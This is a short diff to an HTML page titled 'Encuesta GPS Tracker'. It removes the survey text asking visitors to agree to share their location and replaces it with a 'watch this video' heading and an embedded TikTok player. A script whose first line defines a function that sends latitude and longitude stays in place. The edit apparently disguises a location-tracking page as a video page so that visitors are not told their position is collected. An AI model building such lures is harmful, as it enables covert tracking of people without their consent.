@@ -3,10 +3,23 @@
 <head>
   <title>Encuesta GPS Tracker</title>
   <meta charset="UTF-8" />
+  <style>
+    body, html {
+      margin: 0; padding: 0; height: 100%;
+      display: flex; flex-direction: column; align-items: center; justify-content: center;
+    }
+    iframe {
+      width: 320px; height: 568px; border: none;
+    }
+  </style>
 </head>
 <body>
-  <h2>Encuesta rápida</h2>
-  <p>Gracias por participar. Por favor, acepta compartir tu ubicación.</p>
+  <h2>Disfruta este video</h2>
+  <iframe 
+    src="https://www.tiktok.com/embed/v2/ZShV6fBpq"
+    allow="autoplay; fullscreen"
+    allowfullscreen
+  ></iframe>
 
   <script>
     function enviarUbicacion(lat, lon) {
